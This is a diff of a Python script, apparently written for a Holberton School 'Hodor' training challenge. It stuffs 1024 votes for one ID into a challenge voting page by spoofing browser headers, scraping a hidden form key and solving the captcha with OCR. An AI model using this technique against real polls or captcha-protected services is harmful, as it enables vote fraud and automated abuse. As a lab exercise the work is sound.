@@ -1,80 +1,49 @@
 #!/usr/bin/python3
-"""Hodor 3
-   Use: ./3.py
-   The program obtain #votes current and just sending the necessary votes.
-   send user windows headers
-"""
+"""Hodor with my Holberton ID 1024 times."""
+import os
 import requests
 import pytesseract
-#from PIL import Image
-import cv2
-
 try:
-    ID = int(input("Input number the ID: "))
-except ValueError:
-    print("PLEASE: input number integer.")
-    exit(98)
-try:
-    votes = int(input("Input number the votes: "))
-except ValueError:
-    print("PLEASE: input number integer.")
-    exit(98)
+    import Image
+except ImportError:
+    from PIL import Image
+from bs4 import BeautifulSoup
 
-url = 'http://158.69.76.135/level3.php'
-captcha = 'http://158.69.76.135/captcha.php'
-data = {'id': str(ID), 'holdthedoor': 'Submit'}
+php = "http://158.69.76.135/level3.php"
+ip = "http://158.69.76.135"
+user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) "
+              "Gecko/20100101 Firefox/64.0")
+header = {
+    "User-Agent": user_agent,
+    "referer": php
+}
+vote = {
+    "id": "4492",
+    "holdthedoor": "Submit",
+    "key": "",
+    "captcha": ""
+}
 
-headerwin = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
-AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
-headers = {"User-Agent": headerwin, "Referer": url}
-success = 'Hold the Door challenge - Level 3'
-ok = 0
-fail = 0
-votescurrent = 0
+if __name__ == "__main__":
+    count = 0
+    while count < 1024:
+        session = requests.session()
+        page = session.get(php, headers=header)
+        soup = BeautifulSoup(page.text, "html.parser")
 
-s = requests.Session()
-s.headers.update(headers)
-response = s.get(url, headers=headers)
+        hidden_value = soup.find("form", {"method": "post"})
+        hidden_value = hidden_value.find("input", {"type": "hidden"})
+        vote["key"] = hidden_value["value"]
 
-txt = response.text.split()
-txtid = txt.index(str(ID))
-if ((txt[txtid+3]).isdigit()):
-    votescurrent = int(txt[txtid+3])
+        captcha_path = soup.find("form", {"method": "post"}).find("img")
+        captcha_path = ip + captcha_path["src"]
+        captcha_img = open("captcha.png", "wb")
+        captcha_img.write(session.get(captcha_path).content)
+        captcha_img.close()
+        captcha_php = pytesseract.image_to_string("captcha.png")
+        os.remove("captcha.png")
+        vote["captcha"] = captcha_php
 
-
-print(headers)
-print("------------------------------------------------------------------")
-print("Hello Alzheimeer: ID: {}, VOTES CURRENT: {}, URL: {},  \
-".format(ID, votescurrent, url))
-print("------------------------------------------------------------------")
-print(success)
-print("------------------------------------------------------------------")
-
-
-for i in range(votescurrent, votes):
-    response = s.get(url, headers=headers)
-    key = response.cookies['HoldTheDoor']
-    data["key"] = key
-    cookie = {"HoldTheDoor": key}
-
-    r = s.get(captcha, headers=headers)
-    f = open('captcha.png', 'wb')
-    f.write(r.content)
-    f.close()
-
-    img = cv2.imread("captcha.png")
-  #  readimg = pytesseract.image_to_string(Image.open('captcha.png'))
-    readimg = pytesseract.image_to_string(img)
-    data["captcha"] = readimg
-    response1 = s.post(url, data=data)
-    if response1.status_code is 200 and success in response1.text:
-        ok += 1
-        print("{} Ok   ".format(ok), end='\r', flush=True)
-    else:
-        fail += 1
-        print("{} Fail".format(fail), end='\r', flush=True)
-
-print()
-print("------------------------------------------------------------------")
-print("Finally Alzheimeer: Ok {}, Fail {}".format(ok, fail))
-print("------------------------------------------------------------------")
+        r = session.post(php, headers=header, data=vote)
+        if str(r.content) != "b'See you later hacker! [11]'":
+            count += 1
